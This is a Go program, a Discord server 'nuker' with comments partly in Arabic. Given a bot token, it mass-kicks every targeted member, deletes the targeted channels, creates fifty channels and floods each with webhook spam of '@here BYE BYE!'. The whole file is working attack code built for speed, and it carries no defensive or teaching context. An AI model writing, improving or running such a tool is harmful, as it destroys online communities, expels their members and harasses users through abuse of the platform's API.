package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"sync"
	"time"
)

type ActionRequest struct {
	Token      string   `json:"token"`
	GuildID    string   `json:"guild_id"`
	TargetIDs  []string `json:"target_ids"`
	ActionType string   `json:"action_type"`
}

const (
	SpamMessage      = "@here BYE BYE! 💥"
	MaxWorkers       = 10000 // رفع سقف العمال (Workers) للحد الأقصى للمعالج
	ChannelCount     = 50
	WebhookPerChan   = 10    // زيادة الويبهوكات لضمان غمر السيرفر بالكامل
	BurstMessages    = 50    // عدد الرسائل لكل ويبهوك في انفجار واحد
)

func main() {
	// تحسين أداء المعالج ليعمل بكامل طاقته (Atomic Scaling)
	runtime.GOMAXPROCS(runtime.NumCPU())

	if len(os.Args) < 2 {
		os.Exit(1)
	}

	var req ActionRequest
	if err := json.Unmarshal([]byte(os.Args[1]), &req); err != nil {
		os.Exit(1)
	}

	// تخصيص عميل HTTP فائق السرعة مع تقنيات Pipelining
	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   2 * time.Second,
			KeepAlive: 60 * time.Second,
		}).DialContext,
		MaxIdleConns:        20000,
		MaxIdleConnsPerHost: 20000,
		IdleConnTimeout:     120 * time.Second,
		TLSHandshakeTimeout: 2 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
	}
	client := &http.Client{Transport: transport}

	var wg sync.WaitGroup

	if req.ActionType == "die" {
		// --- DIE: ATOMIC MASS KICK ---
		// إرسال جميع طلبات الطرد في ميكرو-ثانية واحدة
		for _, memberID := range req.TargetIDs {
			wg.Add(1)
			go func(id string) {
				defer wg.Done()
				url := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/members/%s", req.GuildID, id)
				hReq, _ := http.NewRequest("DELETE", url, nil)
				hReq.Header.Set("Authorization", "Bot "+req.Token)
				hReq.Header.Set("X-Audit-Log-Reason", "ATOMIC_DESTRUCTION")
				resp, err := client.Do(hReq)
				if err == nil {
					resp.Body.Close()
				}
			}(memberID)
		}
	} else if req.ActionType == "dead" {
		// --- DEAD: NUCLEAR EXPLOSION & TOTAL FLOOD ---
		
		// 1. Instant Channel Deletion (Lock-Free)
		for _, channelID := range req.TargetIDs {
			wg.Add(1)
			go func(id string) {
				defer wg.Done()
				url := fmt.Sprintf("https://discord.com/api/v10/channels/%s", id)
				hReq, _ := http.NewRequest("DELETE", url, nil)
				hReq.Header.Set("Authorization", "Bot "+req.Token)
				resp, err := client.Do(hReq)
				if err == nil {
					resp.Body.Close()
				}
			}(channelID)
		}

		// 2. Hyper-Speed Channel Creation & Webhook Saturation
		for i := 0; i < ChannelCount; i++ {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				chanUrl := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/channels", req.GuildID)
				body, _ := json.Marshal(map[string]interface{}{
					"name": fmt.Sprintf("nuclear-bye-%d", idx),
					"type": 0,
				})
				hReq, _ := http.NewRequest("POST", chanUrl, bytes.NewBuffer(body))
				hReq.Header.Set("Authorization", "Bot "+req.Token)
				hReq.Header.Set("Content-Type", "application/json")
				resp, err := client.Do(hReq)
				if err != nil {
					return
				}
				
				var cData struct{ ID string }
				json.NewDecoder(resp.Body).Decode(&cData)
				resp.Body.Close()

				if cData.ID != "" {
					// Create 10 webhooks per channel simultaneously (Saturation Mode)
					for w := 0; w < WebhookPerChan; w++ {
						wg.Add(1)
						go func(cID string, wIdx int) {
							defer wg.Done()
							whUrl := fmt.Sprintf("https://discord.com/api/v10/channels/%s/webhooks", cID)
							whBody, _ := json.Marshal(map[string]string{"name": "Nuclear-System"})
							whReq, _ := http.NewRequest("POST", whUrl, bytes.NewBuffer(whBody))
							whReq.Header.Set("Authorization", "Bot "+req.Token)
							whReq.Header.Set("Content-Type", "application/json")
							whResp, err := client.Do(whReq)
							if err != nil {
								return
							}
							
							var whData struct{ URL string }
							json.NewDecoder(whResp.Body).Decode(&whData)
							whResp.Body.Close()

							if whData.URL != "" {
								// Nuclear Burst Spam: Massive parallel message flooding
								for s := 0; s < BurstMessages; s++ {
									sBody, _ := json.Marshal(map[string]string{"content": SpamMessage})
									// Fire and Forget (لا ننتظر أي رد، نرسل فقط)
									go func(url string, data []byte) {
										http.Post(url, "application/json", bytes.NewBuffer(data))
									}(whData.URL, sBody)
								}
							}
						}(cData.ID, w)
					}
				}
			}(i)
		}
	}

	wg.Wait()
}
